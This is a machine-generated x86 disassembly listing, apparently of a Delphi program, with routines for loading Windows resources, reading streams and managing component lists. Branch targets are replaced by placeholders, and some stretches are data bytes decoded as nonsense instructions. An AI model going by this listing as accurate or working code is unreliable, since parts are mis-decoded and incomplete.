pop ebx
pop ebp
retn 0x8
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41aca8
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41ad0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad12
lea eax [ ebp - 0xc ]
call sub_403f40
retn
sub_41ad18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41aca8
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41aa40
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41aca8
pop ecx
sub_41ad84
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406c88
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_41add4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026dc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41ae1c
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026fc
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_41ae4c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
scasb [ edi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x180041ae ] dh
add [ eax ] al
add [ eax - 0x4bffbff0 ] dh
xor eax [ eax ]
shl [ ebx ] 0x40
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add al al
scasd [ edi ]
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
shr [ edi + 0x540e0041 ] 0x1
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
or al 0xaf
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
scasd [ edi ]
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax - 0x52 ] cl
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add al dl
scasd [ edi ]
inc ecx
add [ esi ] cl
push esp
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404030
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4044a0
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403f94
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403f94
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41af20
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403f94
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403f94
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41af78
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404030
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4044a0
mov al 0x1
inc ebx
sub_41afd0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b047
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4058d0
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_415024
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b04e
lea eax [ ebp - 0x4 ]
call sub_4058d0
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_4148e0
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_4058d0
mov ecx eax
mov eax esi
pop edx
call sub_40d3e0
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4058d0
sub_41b054
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41b0fa
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b101
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404030
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_41ebe0
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407fec
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41b11c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_417ef0
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_417ef0
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_417d38
sub_41b154
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_417ef0
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_417ef0
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_417d84
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_417d38
sub_41b19c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41b335
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_418258
mov edi eax
xor edx edx
push ebp
push sub_41b316
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b31d
mov eax [ rw-data ]
call sub_4182bc
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41b2f7
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41b2a5
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_417e94
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4179e0
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b2ac
mov eax [ ebp - 0x8 ]
call sub_40316c
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_414a60
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41b11c
pop ecx
mov edx esi
mov eax edi
call sub_417d84
mov eax ebx
call sub_40316c
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41b054
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41b154
pop ecx
inc esi
sub_41b2ac
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_417e94
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
sub_41b344
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418258
mov edi eax
xor eax eax
push ebp
push sub_41b3df
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4182bc
retn
mov edx ebx
mov eax edi
call sub_417e94
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_417d84
mov eax esi
call sub_40316c
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407fec
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41b3f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418258
mov edi eax
xor eax eax
push ebp
push sub_41b467
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4182bc
retn
mov edx ebx
mov eax edi
call sub_417e94
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_417d84
mov eax esi
call sub_40316c
sub_41b498
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
pop ecx
pop edx
pop ebx
retn
sub_41b4dc
push ebx
push esi
push edi
call sub_4034f8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41ae1c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_41b518
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41d3f0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41d500
call sub_41b48c
sub_41b53c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407fec
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403f40
sub_41b570
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407fec
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d3f0
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41b631
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41b9b4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41b9b4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b638
mov eax [ ebp - 0x8 ]
call sub_40316c
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41d500
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41b48c
sub_41b660
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41b680
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_4041dc
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4033f0
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41b48c
sub_41b6e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_418258
mov esi eax
xor edx edx
push ebp
push sub_41b758
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b75f
mov eax [ rw-data ]
call sub_4182bc
retn
mov edx ebx
mov eax esi
call sub_417e94
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_40316c
mov edx ebx
mov eax esi
call sub_417d84
sub_41b764
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b873
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b87a
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
xor edx edx
push ebp
push sub_41b856
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b8a8
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41af78
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_417e94
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_403fd8
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41b054
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_417e94
call sub_41b6e8
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_417e94
mov edx eax
mov eax [ rw-data ]
call sub_4181d0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_417fe0
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41b884
push ebx
mov ebx eax
mov eax ebx
call sub_41b978
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41a3e0
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41b8a8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_40316c
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_417e94
call sub_40316c
inc edi
dec esi
jne r-xdata
sub_41b8e4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4030b4
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_417528
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4030f8
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_4175a0
mov edi eax
mov edx [ esp + 0x4 ]
call sub_4174a0
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4030d0
test al al
jne r-xdata
sub_41b9b4
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41ba00
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41ba00
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
sub_41ba50
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41ba9b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d250
mov eax [ ebp - 0x4 ]
call sub_404200
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41baa2
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
call sub_41b48c
sub_41baa8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41bb48
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41b64c
test al al
jne r-xdata
mov eax ebx
call sub_41b64c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418b48
jmp r-xdata
mov eax ebx
call sub_41b990
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41c5b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb4f
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_418a7c
mov esi eax
mov eax ebx
call sub_41c5b0
jmp r-xdata
mov eax ebx
call sub_41c500
mov eax ebx
call sub_41b64c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41c71c
mov eax ebx
call sub_41c5b8
sub_41bb78
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f68
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_417d38
inc esi
dec ebx
jne r-xdata
sub_41bbb4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_41ecfc
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f68
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405124
add esp 0x4
mov edx ebx
mov eax edi
call sub_41ecd0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f68
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_41ecd0
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41bc2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f68
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41bc94
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41bcb4
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40276c
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41bc94
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41d6e4
call sub_40276c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_40316c
sub_41bd14
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41bdfa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41d884
mov ebx eax
